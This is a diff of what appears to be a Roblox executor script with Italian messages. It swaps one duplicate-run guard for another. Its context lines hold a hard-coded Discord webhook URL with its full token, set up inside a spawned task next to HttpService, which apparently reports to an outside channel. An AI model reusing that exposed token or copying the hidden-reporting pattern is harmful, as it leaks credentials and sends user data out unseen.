@@ -1,3 +1,10 @@
+if getgenv().ScriptAlreadyRunning then
+	warn("Lo script è già in esecuzione! Ignoro questa esecuzione.")
+	return
+end
+
+getgenv().ScriptAlreadyRunning = true
+
 task.spawn(function()
 	local HttpService = game:GetService("HttpService")
 	local Webhook_URL = "https://discord.com/api/webhooks/1456385233564733561/0Bom3FZYJaSBocpwj-cx2nHKIZP95tzpATGbfuuKrT1W9jxgjLtgPXeAuj6GZBWgqTm-"
@@ -61,15 +68,6 @@ local localPlayer = Players.LocalPlayer
 -- ==============================================================================
 -- CONTROLLI INIZIALI
 -- ==============================================================================
-
-if game:GetService("CoreGui"):FindFirstChild("__MAIN_SCRIPT_RUNNING__") then
-	print("Avviso: Script già in esecuzione.")
-	return 
-end
-
-local executionFlag = Instance.new("ScreenGui")
-executionFlag.Name = "__MAIN_SCRIPT_RUNNING__"
-executionFlag.Parent = game:GetService("CoreGui")
 
 if #Players:GetPlayers() > 1 then
 	localPlayer:Kick("Kick: Il server non è vuoto. Lo script non può essere eseguito.")
